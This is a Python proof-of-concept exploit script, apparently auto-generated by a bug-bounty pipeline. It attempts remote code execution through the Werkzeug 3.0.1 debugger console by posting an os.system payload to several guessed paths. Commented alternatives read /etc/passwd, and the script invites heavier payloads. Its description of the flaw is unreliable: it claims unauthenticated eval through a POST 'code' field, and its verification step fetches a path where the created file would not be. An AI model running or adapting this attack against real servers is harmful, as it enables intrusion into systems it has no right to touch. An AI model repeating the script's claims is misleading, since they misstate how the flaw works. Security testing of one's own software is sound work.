#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: rce-018
# Sink: eval
# Auto-generated — run with: python3 rce_python_code_execution_eval_eval_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for werkzeug 3.0.1 debugger RCE.
The interactive debugger console endpoint accepts arbitrary Python code
via HTTP POST and executes it with eval() without authentication.
"""

import sys
import requests
import argparse
import time

# Default target - change via command line arguments
DEFAULT_TARGET = "http://127.0.0.1:5000"
DEFAULT_TIMEOUT = 10  # seconds

def exploit(target_url, timeout=DEFAULT_TIMEOUT):
    """
    Exploit the werkzeug debugger RCE by sending a malicious command
    to the console endpoint.
    
    The debugger console is typically accessible at:
    /console or /debug/console
    
    We try multiple common paths.
    """
    
    # Benign payload - creates a file to prove code execution
    # Change this to something more dangerous if you understand the risks
    payload = "__import__('os').system('touch /tmp/poc_success.txt')"
    
    # Alternative payloads (commented out for safety):
    # payload = "__import__('os').system('id')"  # Get user info
    # payload = "__import__('os').system('cat /etc/passwd')"  # Read file
    
    # Common debugger console paths
    paths = [
        "/console",
        "/debug/console",
        "/__debugger__/console",
        "/werkzeug/console",
    ]
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload: {payload}")
    print(f"[*] Timeout: {timeout}s")
    print()
    
    for path in paths:
        url = f"{target_url.rstrip('/')}{path}"
        print(f"[*] Trying: {url}")
        
        try:
            # The debugger console expects a POST with 'code' parameter
            response = requests.post(
                url,
                data={"code": payload},
                timeout=timeout,
                headers={
                    "User-Agent": "Mozilla/5.0 (PoC Exploit)",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
            )
            
            print(f"    Status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"[+] SUCCESS! Code execution achieved at {url}")
                print(f"[+] Response length: {len(response.text)} bytes")
                print(f"[+] Response preview: {response.text[:200]}")
                
                # Verify the file was created
                verify_url = f"{target_url.rstrip('/')}/static/../poc_success.txt"
                try:
                    verify = requests.get(verify_url, timeout=timeout)
                    if verify.status_code == 200:
                        print("[+] Verification file exists!")
                except:
                    pass
                
                return True
            elif response.status_code == 404:
                print("    Path not found, trying next...")
            elif response.status_code == 403:
                print("    Access forbidden (403)")
            elif response.status_code == 500:
                print("    Server error (500) - might have executed but crashed")
            else:
                print(f"    Unexpected status code")
                
        except requests.exceptions.ConnectionError:
            print(f"    [!] Connection refused - server may not be running")
        except requests.exceptions.Timeout:
            print(f"    [!] Request timed out after {timeout}s")
        except Exception as e:
            print(f"    [!] Error: {e}")
        
        # Small delay between attempts
        time.sleep(0.5)
    
    print("\n[-] Exploit failed - no vulnerable endpoint found")
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for werkzeug 3.0.1 debugger RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t http://localhost:5000
  %(prog)s -t http://192.168.1.100:8080 --timeout 5
        """
    )
    
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Werkzeug 3.0.1 Debugger RCE PoC")
    print("=" * 60)
    print()
    
    success = exploit(args.target, args.timeout)
    
    if success:
        print("\n[+] Exploit completed successfully")
        print("[+] Check /tmp/poc_success.txt on the target server")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
